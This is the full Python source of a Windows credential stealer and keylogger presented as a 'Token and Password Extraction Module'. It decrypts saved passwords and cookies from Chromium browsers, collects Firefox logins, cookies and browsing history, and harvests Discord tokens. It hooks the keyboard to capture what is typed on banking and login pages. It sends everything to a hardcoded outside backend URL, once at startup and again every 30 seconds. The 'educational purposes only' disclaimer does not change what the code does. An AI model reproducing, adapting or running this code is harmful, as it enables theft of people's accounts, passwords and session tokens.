"""
Token and Password Extraction Module for Windows
- Extracts saved credentials from multiple browsers:
  Chrome, Brave, Firefox, Opera, Microsoft Edge, Vivaldi, etc.
- Retrieves tokens, cookies, and login data
- Real-time password capture via keyboard hooks
- Sends extracted data to backend server

WARNING: This is for EDUCATIONAL/RESEARCH purposes only.
Unauthorized access to computer systems is illegal.
"""

import os
import sys
import json
import base64
import sqlite3
import shutil
import platform
import requests
import threading
import time
import re
from datetime import datetime, timedelta
from pathlib import Path
from collections import deque

# Backend server URL
BACKEND_URL = "https://clownfish-app-5kdkx.ondigitalocean.app"

# Browser paths configuration for Windows
# Format: (browser_name, local_state_path, login_data_path, cookies_path, history_path)
CHROMIUM_BROWSERS = {
    "Chrome": {
        "local_state": os.path.join("Google", "Chrome", "User Data", "Local State"),
        "login_data": os.path.join("Google", "Chrome", "User Data", "Default", "Login Data"),
        "cookies": os.path.join("Google", "Chrome", "User Data", "Default", "Network", "Cookies"),
        "cookies_alt": os.path.join("Google", "Chrome", "User Data", "Default", "Cookies"),
        "history": os.path.join("Google", "Chrome", "User Data", "Default", "History"),
        "base_path": "Local"
    },
    "Brave": {
        "local_state": os.path.join("BraveSoftware", "Brave-Browser", "User Data", "Local State"),
        "login_data": os.path.join("BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data"),
        "cookies": os.path.join("BraveSoftware", "Brave-Browser", "User Data", "Default", "Network", "Cookies"),
        "cookies_alt": os.path.join("BraveSoftware", "Brave-Browser", "User Data", "Default", "Cookies"),
        "history": os.path.join("BraveSoftware", "Brave-Browser", "User Data", "Default", "History"),
        "base_path": "Local"
    },
    "Edge": {
        "local_state": os.path.join("Microsoft", "Edge", "User Data", "Local State"),
        "login_data": os.path.join("Microsoft", "Edge", "User Data", "Default", "Login Data"),
        "cookies": os.path.join("Microsoft", "Edge", "User Data", "Default", "Network", "Cookies"),
        "cookies_alt": os.path.join("Microsoft", "Edge", "User Data", "Default", "Cookies"),
        "history": os.path.join("Microsoft", "Edge", "User Data", "Default", "History"),
        "base_path": "Local"
    },
    "Opera": {
        "local_state": os.path.join("Opera Software", "Opera Stable", "Local State"),
        "login_data": os.path.join("Opera Software", "Opera Stable", "Login Data"),
        "cookies": os.path.join("Opera Software", "Opera Stable", "Network", "Cookies"),
        "cookies_alt": os.path.join("Opera Software", "Opera Stable", "Cookies"),
        "history": os.path.join("Opera Software", "Opera Stable", "History"),
        "base_path": "Roaming"
    },
    "Opera GX": {
        "local_state": os.path.join("Opera Software", "Opera GX Stable", "Local State"),
        "login_data": os.path.join("Opera Software", "Opera GX Stable", "Login Data"),
        "cookies": os.path.join("Opera Software", "Opera GX Stable", "Network", "Cookies"),
        "cookies_alt": os.path.join("Opera Software", "Opera GX Stable", "Cookies"),
        "history": os.path.join("Opera Software", "Opera GX Stable", "History"),
        "base_path": "Roaming"
    },
    "Vivaldi": {
        "local_state": os.path.join("Vivaldi", "User Data", "Local State"),
        "login_data": os.path.join("Vivaldi", "User Data", "Default", "Login Data"),
        "cookies": os.path.join("Vivaldi", "User Data", "Default", "Network", "Cookies"),
        "cookies_alt": os.path.join("Vivaldi", "User Data", "Default", "Cookies"),
        "history": os.path.join("Vivaldi", "User Data", "Default", "History"),
        "base_path": "Local"
    },
    "Chromium": {
        "local_state": os.path.join("Chromium", "User Data", "Local State"),
        "login_data": os.path.join("Chromium", "User Data", "Default", "Login Data"),
        "cookies": os.path.join("Chromium", "User Data", "Default", "Network", "Cookies"),
        "cookies_alt": os.path.join("Chromium", "User Data", "Default", "Cookies"),
        "history": os.path.join("Chromium", "User Data", "Default", "History"),
        "base_path": "Local"
    },
    "Yandex": {
        "local_state": os.path.join("Yandex", "YandexBrowser", "User Data", "Local State"),
        "login_data": os.path.join("Yandex", "YandexBrowser", "User Data", "Default", "Login Data"),
        "cookies": os.path.join("Yandex", "YandexBrowser", "User Data", "Default", "Network", "Cookies"),
        "cookies_alt": os.path.join("Yandex", "YandexBrowser", "User Data", "Default", "Cookies"),
        "history": os.path.join("Yandex", "YandexBrowser", "User Data", "Default", "History"),
        "base_path": "Local"
    },
}

# Firefox profile paths
FIREFOX_PATHS = {
    "Firefox": os.path.join("Mozilla", "Firefox", "Profiles"),
    "Firefox Developer": os.path.join("Mozilla", "Firefox Developer Edition", "Profiles"),
    "Waterfox": os.path.join("Waterfox", "Profiles"),
    "Pale Moon": os.path.join("Moonchild Productions", "Pale Moon", "Profiles"),
}


def get_system_info():
    """Get basic system information"""
    return {
        "hostname": platform.node(),
        "os": platform.system(),
        "os_version": platform.version(),
        "architecture": platform.architecture()[0],
        "username": os.getenv("USERNAME") or os.getenv("USER"),
        "timestamp": datetime.now().isoformat()
    }


def get_appdata_path(base_type="Local"):
    """Get AppData path based on type (Local or Roaming)"""
    if platform.system() != "Windows":
        return None
    
    if base_type == "Local":
        return os.path.join(os.environ.get("USERPROFILE", ""), "AppData", "Local")
    else:
        return os.path.join(os.environ.get("USERPROFILE", ""), "AppData", "Roaming")


def get_encryption_key(local_state_path):
    """
    Get the AES encryption key used by Chromium browsers to encrypt passwords
    This key is stored in Local State file and encrypted with Windows DPAPI
    """
    try:
        if platform.system() != "Windows":
            return None
            
        if not os.path.exists(local_state_path):
            return None
        
        import win32crypt
        
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
            
        # Get the encrypted key
        encrypted_key = base64.b64decode(
            local_state["os_crypt"]["encrypted_key"]
        )
        
        # Remove DPAPI prefix (first 5 bytes = "DPAPI")
        encrypted_key = encrypted_key[5:]
        
        # Decrypt using Windows DPAPI
        decrypted_key = win32crypt.CryptUnprotectData(
            encrypted_key, None, None, None, 0
        )[1]
        
        return decrypted_key
        
    except Exception as e:
        print(f"    [!] Error getting encryption key: {e}")
        return None


def decrypt_password(encrypted_password, key):
    """
    Decrypt Chromium browser password using AES-GCM
    """
    try:
        if platform.system() != "Windows":
            return None
        
        if not encrypted_password:
            return None
            
        # Check if it's v10/v11 encryption (AES-GCM)
        if encrypted_password[:3] == b'v10' or encrypted_password[:3] == b'v11':
            if not key:
                return "[no_key]"
                
            from Crypto.Cipher import AES
            
            # Get initialization vector (12 bytes after version prefix)
            iv = encrypted_password[3:15]
            
            # Get encrypted password (everything after IV, minus 16 byte auth tag)
            payload = encrypted_password[15:]
            
            # Decrypt using AES-GCM
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_password = cipher.decrypt(payload)
            
            # Remove authentication tag (last 16 bytes)
            decrypted_password = decrypted_password[:-16].decode('utf-8', errors='ignore')
            
            return decrypted_password
        else:
            # Old DPAPI method
            import win32crypt
            decrypted = win32crypt.CryptUnprotectData(
                encrypted_password, None, None, None, 0
            )[1]
            return decrypted.decode('utf-8', errors='ignore')
            
    except Exception as e:
        return "[decryption_failed]"


def get_chromium_passwords(browser_name, browser_config):
    """
    Extract saved passwords from Chromium-based browsers
    """
    passwords = []
    
    try:
        if platform.system() != "Windows":
            return passwords
        
        # Get base path
        base_path = get_appdata_path(browser_config["base_path"])
        if not base_path:
            return passwords
            
        # Get login data path
        login_data_path = os.path.join(base_path, browser_config["login_data"])
        
        if not os.path.exists(login_data_path):
            print(f"    [!] {browser_name} Login Data not found")
            return passwords
            
        # Get encryption key
        local_state_path = os.path.join(base_path, browser_config["local_state"])
        key = get_encryption_key(local_state_path)
        
        # Copy database to temp location (browser locks the file)
        temp_db = os.path.join(os.environ.get("TEMP", "/tmp"), f"{browser_name.lower()}_login_data.db")
        shutil.copy2(login_data_path, temp_db)
        
        # Connect to database
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        # Query saved passwords
        cursor.execute("""
            SELECT origin_url, action_url, username_value, password_value, 
                   date_created, date_last_used
            FROM logins
            ORDER BY date_last_used DESC
        """)
        
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            encrypted_password = row[3]
            date_created = row[4]
            date_last_used = row[5]
            
            # Decrypt password
            password = decrypt_password(encrypted_password, key)
            
            if username or password:
                passwords.append({
                    "browser": browser_name,
                    "origin_url": origin_url,
                    "action_url": action_url,
                    "username": username,
                    "password": password if password else "[empty]",
                    "date_created": str(date_created),
                    "date_last_used": str(date_last_used)
                })
        
        cursor.close()
        conn.close()
        
        # Clean up temp file
        try:
            os.remove(temp_db)
        except:
            pass
        
        print(f"    [+] Extracted {len(passwords)} passwords from {browser_name}")
        
    except Exception as e:
        print(f"    [!] Error extracting {browser_name} passwords: {e}")
        
    return passwords


def get_chromium_cookies(browser_name, browser_config):
    """
    Extract cookies from Chromium-based browsers
    """
    cookies = []
    
    try:
        if platform.system() != "Windows":
            return cookies
        
        # Get base path
        base_path = get_appdata_path(browser_config["base_path"])
        if not base_path:
            return cookies
            
        # Get cookies path (try new location first, then fallback)
        cookie_path = os.path.join(base_path, browser_config["cookies"])
        if not os.path.exists(cookie_path):
            cookie_path = os.path.join(base_path, browser_config["cookies_alt"])
        
        if not os.path.exists(cookie_path):
            print(f"    [!] {browser_name} Cookies not found")
            return cookies
            
        # Get encryption key
        local_state_path = os.path.join(base_path, browser_config["local_state"])
        key = get_encryption_key(local_state_path)
        
        # Copy database to temp location
        temp_db = os.path.join(os.environ.get("TEMP", "/tmp"), f"{browser_name.lower()}_cookies.db")
        shutil.copy2(cookie_path, temp_db)
        
        # Connect to database
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        # Query cookies
        cursor.execute("""
            SELECT host_key, name, encrypted_value, path, 
                   expires_utc, is_secure, is_httponly
            FROM cookies
            ORDER BY host_key
        """)
        
        for row in cursor.fetchall():
            host = row[0]
            name = row[1]
            encrypted_value = row[2]
            path = row[3]
            expires = row[4]
            is_secure = row[5]
            is_httponly = row[6]
            
            # Decrypt cookie value
            value = decrypt_password(encrypted_value, key)
            
            cookies.append({
                "browser": browser_name,
                "host": host,
                "name": name,
                "value": value if value else "[encrypted]",
                "path": path,
                "expires": str(expires),
                "is_secure": bool(is_secure),
                "is_httponly": bool(is_httponly)
            })
        
        cursor.close()
        conn.close()
        
        try:
            os.remove(temp_db)
        except:
            pass
        
        print(f"    [+] Extracted {len(cookies)} cookies from {browser_name}")
        
    except Exception as e:
        print(f"    [!] Error extracting {browser_name} cookies: {e}")
        
    return cookies


def get_chromium_history(browser_name, browser_config):
    """
    Extract browser history from Chromium-based browsers
    """
    history = []
    
    try:
        if platform.system() != "Windows":
            return history
        
        # Get base path
        base_path = get_appdata_path(browser_config["base_path"])
        if not base_path:
            return history
            
        # Get history path
        history_path = os.path.join(base_path, browser_config["history"])
        
        if not os.path.exists(history_path):
            print(f"    [!] {browser_name} History not found")
            return history
            
        # Copy database to temp location
        temp_db = os.path.join(os.environ.get("TEMP", "/tmp"), f"{browser_name.lower()}_history.db")
        shutil.copy2(history_path, temp_db)
        
        # Connect to database
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        # Query recent history
        cursor.execute("""
            SELECT url, title, visit_count, last_visit_time
            FROM urls
            ORDER BY last_visit_time DESC
            LIMIT 200
        """)
        
        for row in cursor.fetchall():
            history.append({
                "browser": browser_name,
                "url": row[0],
                "title": row[1],
                "visit_count": row[2],
                "last_visit": str(row[3])
            })
        
        cursor.close()
        conn.close()
        
        try:
            os.remove(temp_db)
        except:
            pass
        
        print(f"    [+] Extracted {len(history)} history entries from {browser_name}")
        
    except Exception as e:
        print(f"    [!] Error extracting {browser_name} history: {e}")
        
    return history


def get_firefox_profiles():
    """
    Get all Firefox profile directories
    """
    profiles = []
    
    try:
        if platform.system() != "Windows":
            return profiles
            
        roaming = get_appdata_path("Roaming")
        
        for browser_name, profile_path in FIREFOX_PATHS.items():
            full_path = os.path.join(roaming, profile_path)
            
            if os.path.exists(full_path):
                for profile_dir in os.listdir(full_path):
                    profile_full_path = os.path.join(full_path, profile_dir)
                    if os.path.isdir(profile_full_path):
                        profiles.append({
                            "browser": browser_name,
                            "profile": profile_dir,
                            "path": profile_full_path
                        })
                        
    except Exception as e:
        print(f"    [!] Error getting Firefox profiles: {e}")
        
    return profiles


def get_firefox_passwords(profile_info):
    """
    Extract saved passwords from Firefox/Gecko browsers
    Note: Firefox uses NSS for encryption, which is more complex
    This extracts the encrypted data - full decryption requires NSS libraries
    """
    passwords = []
    
    try:
        logins_path = os.path.join(profile_info["path"], "logins.json")
        
        if not os.path.exists(logins_path):
            return passwords
            
        with open(logins_path, "r", encoding="utf-8") as f:
            logins_data = json.load(f)
            
        for login in logins_data.get("logins", []):
            passwords.append({
                "browser": profile_info["browser"],
                "profile": profile_info["profile"],
                "hostname": login.get("hostname", ""),
                "username": login.get("encryptedUsername", "[encrypted]"),
                "password": login.get("encryptedPassword", "[encrypted]"),
                "form_submit_url": login.get("formSubmitURL", ""),
                "time_created": login.get("timeCreated", ""),
                "time_last_used": login.get("timeLastUsed", ""),
                "time_password_changed": login.get("timePasswordChanged", ""),
                "note": "Firefox passwords are encrypted with NSS - requires key4.db for decryption"
            })
            
        print(f"    [+] Found {len(passwords)} passwords from {profile_info['browser']} ({profile_info['profile']})")
        
    except Exception as e:
        print(f"    [!] Error extracting Firefox passwords: {e}")
        
    return passwords


def get_firefox_cookies(profile_info):
    """
    Extract cookies from Firefox/Gecko browsers
    """
    cookies = []
    
    try:
        cookies_path = os.path.join(profile_info["path"], "cookies.sqlite")
        
        if not os.path.exists(cookies_path):
            return cookies
            
        # Copy database
        temp_db = os.path.join(os.environ.get("TEMP", "/tmp"), f"firefox_cookies_{profile_info['profile']}.db")
        shutil.copy2(cookies_path, temp_db)
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        cursor.execute("""
            SELECT host, name, value, path, expiry, isSecure, isHttpOnly
            FROM moz_cookies
            ORDER BY host
        """)
        
        for row in cursor.fetchall():
            cookies.append({
                "browser": profile_info["browser"],
                "profile": profile_info["profile"],
                "host": row[0],
                "name": row[1],
                "value": row[2],
                "path": row[3],
                "expires": str(row[4]),
                "is_secure": bool(row[5]),
                "is_httponly": bool(row[6])
            })
        
        cursor.close()
        conn.close()
        
        try:
            os.remove(temp_db)
        except:
            pass
        
        print(f"    [+] Extracted {len(cookies)} cookies from {profile_info['browser']} ({profile_info['profile']})")
        
    except Exception as e:
        print(f"    [!] Error extracting Firefox cookies: {e}")
        
    return cookies


def get_firefox_history(profile_info):
    """
    Extract browser history from Firefox/Gecko browsers
    """
    history = []
    
    try:
        places_path = os.path.join(profile_info["path"], "places.sqlite")
        
        if not os.path.exists(places_path):
            return history
            
        # Copy database
        temp_db = os.path.join(os.environ.get("TEMP", "/tmp"), f"firefox_history_{profile_info['profile']}.db")
        shutil.copy2(places_path, temp_db)
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        cursor.execute("""
            SELECT url, title, visit_count, last_visit_date
            FROM moz_places
            WHERE visit_count > 0
            ORDER BY last_visit_date DESC
            LIMIT 200
        """)
        
        for row in cursor.fetchall():
            history.append({
                "browser": profile_info["browser"],
                "profile": profile_info["profile"],
                "url": row[0],
                "title": row[1],
                "visit_count": row[2],
                "last_visit": str(row[3])
            })
        
        cursor.close()
        conn.close()
        
        try:
            os.remove(temp_db)
        except:
            pass
        
        print(f"    [+] Extracted {len(history)} history entries from {profile_info['browser']} ({profile_info['profile']})")
        
    except Exception as e:
        print(f"    [!] Error extracting Firefox history: {e}")
        
    return history


def get_discord_tokens():
    """
    Extract Discord tokens from local storage
    """
    tokens = []
    
    try:
        if platform.system() != "Windows":
            return tokens
            
        import re
        
        userprofile = os.environ.get("USERPROFILE", "")
        
        # Discord and browser token paths
        discord_paths = [
            os.path.join(userprofile, "AppData", "Roaming", "Discord", "Local Storage", "leveldb"),
            os.path.join(userprofile, "AppData", "Roaming", "discordcanary", "Local Storage", "leveldb"),
            os.path.join(userprofile, "AppData", "Roaming", "discordptb", "Local Storage", "leveldb"),
            os.path.join(userprofile, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
            os.path.join(userprofile, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),
            os.path.join(userprofile, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),
            os.path.join(userprofile, "AppData", "Roaming", "Opera Software", "Opera Stable", "Local Storage", "leveldb"),
            os.path.join(userprofile, "AppData", "Local", "Vivaldi", "User Data", "Default", "Local Storage", "leveldb"),
        ]
        
        # Token regex patterns
        token_pattern = r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}'
        mfa_pattern = r'mfa\.[\w-]{84}'
        
        for path in discord_paths:
            if not os.path.exists(path):
                continue
                
            for filename in os.listdir(path):
                if not filename.endswith(('.log', '.ldb')):
                    continue
                    
                filepath = os.path.join(path, filename)
                
                try:
                    with open(filepath, 'r', errors='ignore') as f:
                        content = f.read()
                        
                    # Find tokens
                    for token in re.findall(token_pattern, content):
                        if token not in [t["token"] for t in tokens]:
                            tokens.append({
                                "type": "discord_token",
                                "token": token,
                                "source": path
                            })
                            
                    # Find MFA tokens
                    for token in re.findall(mfa_pattern, content):
                        if token not in [t["token"] for t in tokens]:
                            tokens.append({
                                "type": "discord_mfa_token",
                                "token": token,
                                "source": path
                            })
                            
                except Exception:
                    continue
        
        print(f"    [+] Found {len(tokens)} Discord tokens")
        
    except Exception as e:
        print(f"    [!] Error extracting Discord tokens: {e}")
        
    return tokens


def send_to_backend(data):
    """
    Send extracted data to backend server
    Uses the /api/browser-data endpoint to store in DataBrowser table
    """
    try:
        url = f"{BACKEND_URL}/api/browser-data"
        
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
        
        print(f"\n[*] Sending data to: {url}")
        
        response = requests.post(
            url,
            json=data,
            headers=headers,
            timeout=60
        )
        
        if response.status_code == 201:
            result = response.json()
            print(f"[+] Data sent successfully!")
            print(f"    Record ID: {result.get('id')}")
            print(f"    Storage: {result.get('storage')}")
            stats = result.get('stats', {})
            print(f"    Stored - Passwords: {stats.get('passwords', 0)}, "
                  f"Cookies: {stats.get('cookies', 0)}, "
                  f"Tokens: {stats.get('tokens', 0)}, "
                  f"History: {stats.get('history', 0)}")
            return True
        else:
            print(f"[!] Failed to send data. Status: {response.status_code}")
            print(f"[!] Response: {response.text}")
            return False
            
    except requests.exceptions.ConnectionError:
        print("[!] Connection error - server may be offline")
        return False
    except requests.exceptions.Timeout:
        print("[!] Request timed out")
        return False
    except Exception as e:
        print(f"[!] Error sending data: {e}")
        return False


def collect_all_data():
    """
    Collect all browser data and tokens from all installed browsers
    """
    print("\n" + "="*70)
    print("  Multi-Browser Data Extraction Tool")
    print("  Supports: Chrome, Brave, Firefox, Opera, Edge, Vivaldi, and more")
    print("="*70 + "\n")
    
    # Get system info
    system_info = get_system_info()
    print(f"[*] System: {system_info['hostname']} ({system_info['os']})")
    print(f"[*] User: {system_info['username']}")
    print(f"[*] Time: {system_info['timestamp']}\n")
    
    # Initialize data containers
    all_passwords = []
    all_cookies = []
    all_history = []
    all_tokens = []
    
    # ========== CHROMIUM-BASED BROWSERS ==========
    print("[*] Extracting from Chromium-based browsers...")
    print("-" * 50)
    
    for browser_name, browser_config in CHROMIUM_BROWSERS.items():
        print(f"\n  [{browser_name}]")
        
        # Passwords
        passwords = get_chromium_passwords(browser_name, browser_config)
        all_passwords.extend(passwords)
        
        # Cookies
        cookies = get_chromium_cookies(browser_name, browser_config)
        all_cookies.extend(cookies)
        
        # History
        history = get_chromium_history(browser_name, browser_config)
        all_history.extend(history)
    
    # ========== FIREFOX/GECKO BROWSERS ==========
    print("\n\n[*] Extracting from Firefox/Gecko browsers...")
    print("-" * 50)
    
    firefox_profiles = get_firefox_profiles()
    
    for profile in firefox_profiles:
        print(f"\n  [{profile['browser']} - {profile['profile']}]")
        
        # Passwords
        passwords = get_firefox_passwords(profile)
        all_passwords.extend(passwords)
        
        # Cookies
        cookies = get_firefox_cookies(profile)
        all_cookies.extend(cookies)
        
        # History
        history = get_firefox_history(profile)
        all_history.extend(history)
    
    # ========== DISCORD TOKENS ==========
    print("\n\n[*] Extracting Discord tokens...")
    print("-" * 50)
    tokens = get_discord_tokens()
    all_tokens.extend(tokens)
    
    # Compile all data
    collected_data = {
        "system_info": system_info,
        "passwords": {
            "data": all_passwords,
            "total_count": len(all_passwords)
        },
        "cookies": {
            "data": all_cookies[:500],  # Limit cookies
            "total_count": len(all_cookies)
        },
        "history": {
            "data": all_history[:500],  # Limit history
            "total_count": len(all_history)
        },
        "tokens": {
            "data": all_tokens,
            "total_count": len(all_tokens)
        },
        "extraction_timestamp": datetime.now().isoformat()
    }
    
    # Summary
    print("\n\n" + "="*70)
    print("  EXTRACTION SUMMARY")
    print("="*70)
    print(f"  Total Passwords: {collected_data['passwords']['total_count']}")
    print(f"  Total Cookies:   {collected_data['cookies']['total_count']}")
    print(f"  Total History:   {collected_data['history']['total_count']}")
    print(f"  Total Tokens:    {collected_data['tokens']['total_count']}")
    print("="*70)
    
    return collected_data


# ==================== REAL-TIME PASSWORD CAPTURE ====================

# Buffer for real-time captured passwords
realtime_passwords = deque(maxlen=100)
SEND_INTERVAL = 30  # seconds

# Browser window patterns
BROWSER_PATTERNS = ['chrome', 'firefox', 'edge', 'opera', 'brave', 'vivaldi', 'browser']

# Login page patterns
LOGIN_PATTERNS = [
    r'login', r'signin', r'sign-in', r'log-in', r'auth', r'account',
    r'facebook', r'google', r'twitter', r'instagram', r'github',
    r'amazon', r'paypal', r'bank', r'password'
]


def is_browser_window(title):
    """Check if window is a browser"""
    return any(b in title.lower() for b in BROWSER_PATTERNS)


def is_login_page(title):
    """Check if window suggests login page"""
    return any(re.search(p, title.lower()) for p in LOGIN_PATTERNS)


def get_active_window():
    """Get current active window title"""
    try:
        if platform.system() == "Windows":
            import ctypes
            user32 = ctypes.windll.user32
            hwnd = user32.GetForegroundWindow()
            length = user32.GetWindowTextLengthW(hwnd)
            buffer = ctypes.create_unicode_buffer(length + 1)
            user32.GetWindowTextW(hwnd, buffer, length + 1)
            return buffer.value
    except:
        pass
    return ""


def send_realtime_data():
    """Send real-time captured passwords to backend"""
    global realtime_passwords
    
    if not realtime_passwords:
        return
    
    data = {
        "system_info": get_system_info(),
        "passwords": {
            "data": list(realtime_passwords),
            "total_count": len(realtime_passwords),
            "capture_type": "realtime_keyboard"
        },
        "cookies": {"data": [], "total_count": 0},
        "history": {"data": [], "total_count": 0},
        "tokens": {"data": [], "total_count": 0},
        "extraction_timestamp": datetime.now().isoformat()
    }
    
    if send_to_backend(data):
        realtime_passwords.clear()


def periodic_sender():
    """Background thread to send data periodically"""
    while True:
        time.sleep(SEND_INTERVAL)
        if realtime_passwords:
            send_realtime_data()


class RealtimeCapture:
    """
    Real-time password capture using keyboard hooks
    Captures passwords as user types them in browser login forms
    """
    
    def __init__(self):
        self.current_input = ""
        self.current_window = ""
        self.last_key_time = time.time()
        self.input_timeout = 5
    
    def save_input(self, is_submit=False):
        """Save captured input"""
        if len(self.current_input) >= 4 and is_login_page(self.current_window):
            capture = {
                "window": self.current_window,
                "text": self.current_input,
                "submitted": is_submit,
                "time": datetime.now().isoformat(),
                "method": "keyboard"
            }
            realtime_passwords.append(capture)
            print(f"[+] Captured: {self.current_window[:40]}...")
    
    def on_key(self, key):
        """Handle key press"""
        try:
            window = get_active_window()
            
            if not is_browser_window(window):
                return
            
            if window != self.current_window:
                self.save_input()
                self.current_window = window
                self.current_input = ""
            
            if time.time() - self.last_key_time > self.input_timeout:
                self.save_input()
                self.current_input = ""
            
            self.last_key_time = time.time()
            key_str = str(key)
            
            if hasattr(key, 'char') and key.char:
                self.current_input += key.char
            elif 'enter' in key_str.lower():
                self.save_input(is_submit=True)
                self.current_input = ""
            elif 'backspace' in key_str.lower():
                self.current_input = self.current_input[:-1]
            elif 'tab' in key_str.lower():
                self.save_input()
                self.current_input = ""
            elif 'space' in key_str.lower():
                self.current_input += " "
        except:
            pass
    
    def start(self):
        """Start keyboard capture"""
        try:
            from pynput import keyboard
            print("[+] Starting keyboard capture with pynput...")
            with keyboard.Listener(on_press=self.on_key) as listener:
                listener.join()
        except ImportError:
            print("[!] pynput not installed. Using win32 hooks...")
            self.start_win32()
    
    def start_win32(self):
        """Win32 hook-based capture"""
        try:
            import ctypes
            from ctypes import wintypes, CFUNCTYPE, c_int
            
            user32 = ctypes.windll.user32
            kernel32 = ctypes.windll.kernel32
            
            WH_KEYBOARD_LL = 13
            WM_KEYDOWN = 0x0100
            
            HOOKPROC = CFUNCTYPE(c_int, c_int, wintypes.WPARAM, wintypes.LPARAM)
            
            class KBDLLHOOKSTRUCT(ctypes.Structure):
                _fields_ = [
                    ("vkCode", wintypes.DWORD),
                    ("scanCode", wintypes.DWORD),
                    ("flags", wintypes.DWORD),
                    ("time", wintypes.DWORD),
                    ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong))
                ]
            
            def callback(nCode, wParam, lParam):
                if nCode >= 0 and wParam == WM_KEYDOWN:
                    kb = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
                    self.process_vk(kb.vkCode)
                return user32.CallNextHookEx(None, nCode, wParam, lParam)
            
            cb = HOOKPROC(callback)
            hook = user32.SetWindowsHookExA(WH_KEYBOARD_LL, cb, kernel32.GetModuleHandleW(None), 0)
            
            if hook:
                print("[+] Win32 keyboard hook installed")
                msg = wintypes.MSG()
                while user32.GetMessageA(ctypes.byref(msg), None, 0, 0):
                    user32.TranslateMessage(ctypes.byref(msg))
                    user32.DispatchMessageA(ctypes.byref(msg))
                user32.UnhookWindowsHookEx(hook)
        except Exception as e:
            print(f"[!] Win32 hook failed: {e}")
    
    def process_vk(self, vk):
        """Process virtual key code"""
        window = get_active_window()
        
        if not is_browser_window(window):
            return
        
        if window != self.current_window:
            self.save_input()
            self.current_window = window
            self.current_input = ""
        
        # Convert VK to char
        char = self.vk_to_char(vk)
        
        if char == "[ENTER]":
            self.save_input(is_submit=True)
            self.current_input = ""
        elif char == "[BS]":
            self.current_input = self.current_input[:-1]
        elif char == "[TAB]":
            self.save_input()
            self.current_input = ""
        elif char:
            self.current_input += char
    
    def vk_to_char(self, vk):
        """Convert virtual key to character"""
        try:
            import ctypes
            user32 = ctypes.windll.user32
            shift = user32.GetKeyState(0x10) & 0x8000
            caps = user32.GetKeyState(0x14) & 0x0001
            
            if 0x30 <= vk <= 0x39:  # 0-9
                return chr(vk)
            elif 0x41 <= vk <= 0x5A:  # A-Z
                c = chr(vk)
                return c.upper() if (shift or caps) else c.lower()
            elif vk == 0x0D:
                return "[ENTER]"
            elif vk == 0x08:
                return "[BS]"
            elif vk == 0x09:
                return "[TAB]"
            elif vk == 0x20:
                return " "
            
            special = {0xBD: "-", 0xBB: "=", 0xDB: "[", 0xDD: "]",
                      0xDC: "\\", 0xBA: ";", 0xDE: "'", 0xBC: ",",
                      0xBE: ".", 0xBF: "/", 0xC0: "`"}
            return special.get(vk, None)
        except:
            return None


def run_realtime_capture():
    """Run real-time password capture mode"""
    print("\n[*] Starting real-time password capture...")
    print("[*] Monitoring browser login pages for passwords...")
    print("[*] Press Ctrl+C to stop\n")
    
    if platform.system() != "Windows":
        print("[!] Real-time capture requires Windows OS")
        return
    
    # Start background sender
    sender = threading.Thread(target=periodic_sender, daemon=True)
    sender.start()
    
    # Start capture
    capture = RealtimeCapture()
    capture.start()


def main():
    """
    Main function - runs everything automatically:
    1. Extract stored browser passwords, cookies, history, tokens
    2. Send to backend
    3. Start real-time password capture in background
    """
    print("""
    ╔═══════════════════════════════════════════════════════════════════╗
    ║           Token & Password Access Module v3.0                     ║
    ║                Multi-Browser Extraction Tool                      ║
    ║                                                                   ║
    ║  Features:                                                        ║
    ║  • Extract saved browser passwords & cookies                      ║
    ║  • Real-time password capture (keyboard monitoring)               ║
    ║  • Sends all data to backend server                               ║
    ║                                                                   ║
    ║  Supported Browsers:                                              ║
    ║  • Chromium: Chrome, Brave, Edge, Opera, Vivaldi, Yandex          ║
    ║  • Gecko: Firefox, Waterfox, Pale Moon                            ║
    ║                                                                   ║
    ║  [!] For Educational/Research Purposes Only                       ║
    ╚═══════════════════════════════════════════════════════════════════╝
    """)
    
    if platform.system() != "Windows":
        print("[!] Warning: This script is designed for Windows OS")
        print("[!] Some features may not work on other platforms")
        print()
    
    # ========== STEP 1: Extract stored browser data ==========
    collected_data = collect_all_data()
    
    # ========== STEP 2: Send to backend ==========
    print("\n[*] Sending extracted data to backend server...")
    success = send_to_backend(collected_data)
    
    if success:
        print("[+] Stored browser data sent successfully!")
    else:
        print("[!] Failed to send stored data to backend")
    
    # ========== STEP 3: Start real-time capture ==========
    print("\n" + "="*70)
    print("  STARTING REAL-TIME PASSWORD CAPTURE")
    print("="*70)
    print("\n[*] Now monitoring for new passwords typed in browsers...")
    print("[*] Captured passwords will be sent every 30 seconds")
    print("[*] Press Ctrl+C to stop\n")
    
    try:
        run_realtime_capture()
    except KeyboardInterrupt:
        # Send any remaining captured data before exit
        if realtime_passwords:
            print("\n[*] Sending remaining captured data...")
            send_realtime_data()
        print("\n[*] Stopped by user")
    
    return collected_data


if __name__ == "__main__":
    main()
